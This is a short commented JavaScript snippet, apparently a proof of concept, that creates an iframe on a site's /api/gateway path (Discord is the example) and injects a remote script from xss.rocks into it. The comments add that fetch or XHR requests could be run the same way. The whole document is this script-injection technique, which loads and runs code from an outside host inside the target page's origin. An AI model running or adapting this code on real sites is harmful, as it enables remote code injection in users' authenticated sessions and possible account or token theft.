const frame = document.createElement('iframe'); // Create iframe element
frame.src = `${location.origin}/api/gateway`; // Set src URL to current origin to API with gateway endpoint (eg: https://discord.com/api/gateway)

frame.addEventListener('load', () => {
  // When iframe loads run the iframe side of things
  const script = document.createElement('script'); // Create script element
  script.src = 'https://xss.rocks/xss.js'; // Set source to JS file / URL (xss.rocks as example) - also allows for POST and GETs via fetch() and XHR, just using JS script as example

  frame.contentDocument.head.appendChild(script); // Append script to iframe document's head

  // Code runs, alert shows
})

document.body.appendChild(frame); // Add iframe to document body